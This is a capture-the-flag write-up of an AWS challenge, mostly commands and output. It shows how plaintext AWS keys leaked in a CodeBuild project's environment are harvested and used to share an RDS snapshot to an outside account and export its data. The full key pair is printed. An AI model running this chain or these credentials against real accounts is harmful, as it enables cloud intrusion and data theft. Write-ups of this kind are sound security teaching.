# Pipeline Drift - Cloud Village CTF 2025

## Challenge Description

<img src="./Pipeline_Drift_870pts_part1.jpg" width="300">

## Initial Reconnaissance
Using the credentials provided in the challenge description, we performed basic AWS enumeration:

```bash
aws sts get-caller-identity
{
    "UserId": "AIDAXMQAGGFOSPOD3JJXA",
    "Account": "507880288605",
    "Arn": "arn:aws:iam::507880288605:user/ctf_player"
}
```

Since the challenge mentioned CI/CD operations, we systematically searched for CodeBuild projects across AWS regions:

```bash
bash check_codebuild_regions.sh
Checking CodeBuild projects across all default AWS regions...
==========================================================
Current AWS Identity:
{
    "UserId": "AIDAXMQAGGFOSPOD3JJXA",
    "Account": "507880288605",
    "Arn": "arn:aws:iam::507880288605:user/ctf_player"
}

Checking region: us-east-1
  ❌ No projects found

Checking region: us-east-2
  ❌ No projects found

Checking region: us-west-1
  ❌ No projects found

Checking region: us-west-2
  ✅ Found projects in us-west-2:
    - legacy-project

^C
```

Found `legacy-project` in the `us-west-2` region.

## CodeBuild Leaked Credentials
We examined the legacy project configuration and discovered more credentials:

```bash
aws codebuild batch-get-projects --names legacy-project --region us-west-2
```
```json
            "environment": {
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/amazonlinux2-x86_64-standard:4.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "AWS_ACCESS_KEY_ID",
                        "value": "AKIAXMQAGGFO5DD6NFK7",
                        "type": "PLAINTEXT"
                    },
                    {
                        "name": "AWS_SECRET_ACCESS_KEY",
                        "value": "3Hlzlj+3h2w4Z7L5qZ6JmjRjs1WonB87ujw4nHVo",
                        "type": "PLAINTEXT"
                    }
                ],
                "privilegedMode": false,
                "imagePullCredentialsType": "CODEBUILD"
            },
```

These credentials belonged to a different user: `leaky_user`.

```bash
aws sts get-caller-identity
{
    "UserId": "AIDAXMQAGGFO2NODOZTLM",
    "Account": "507880288605",
    "Arn": "arn:aws:iam::507880288605:user/leaky_user"
}
```

Doing some quick enumeration I didn't found any bucket or interesting role, so I've decided to use Prowler to check for any interesting findings in the account.

```bash
prowler aws --region us-west-2
```

The OCSF output showed some RDS resources worth digging:
![alt text](image.png)

## The "Pipeline Drift"
The `legacy-app-db-snapshot` resonated with the concept of "pipeline drift" - leftover infrastructure that should have been cleaned up when the original database was decommissioned during infrastructure changes.

The snapshot was already shared with external accounts, so it looks we could add our own account to the list of allowed accounts:

```bash
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier "legacy-app-db-snapshot" \
    --attribute-name "restore" \
    --values-to-add "[REDACTED]" \
    --region us-west-2
```

## RDS Snapshot Copy
Switching to personal AWS credentials, we copied the shared snapshot:

```bash
aws rds copy-db-snapshot \
    --source-db-snapshot-identifier "arn:aws:rds:us-west-2:507880288605:snapshot:legacy-app-db-snapshot" \
    --target-db-snapshot-identifier "legacy-ctf-copy-$(date +%s)" \
    --region "us-west-2"
```

Now, instead of restoring the full database, we exported the snapshot data to S3 for analysis:

```bash
aws s3 mb s3://rds-snapshot-export-ctf-1754679175 --region us-west-2

aws rds start-export-task \
    --export-task-identifier "legacy-export-$(date +%s)" \
    --source-arn "arn:aws:rds:us-west-2:[REDACTED]:snapshot:legacy-ctf-copy-1754679887" \
    --s3-bucket-name "rds-snapshot-export-ctf-1754679175" \
    --iam-role-arn "arn:aws:iam::[REDACTED]:role/rds-snapshot-export-role" \
    --kms-key-id "alias/ctf" \
    --region "us-west-2"
```

Downloaded the exported Parquet files and analyzed the database contents:

```bash
aws s3 sync "s3://rds-snapshot-export-ctf-1754679175/legacy-export-1754680136/" ./exported-database-data/
```

Using an [online parquet viewer](https://www.parquet-viewer.com), we found the flag in the `secrets` table:
![](parquet.png)

## Conclusion
The Pipeline Drift challenge showcased how poor CI/CD security combined with inadequate infrastructure lifecycle management can lead to significant data exposure, emphasizing the need for comprehensive cloud security practices.
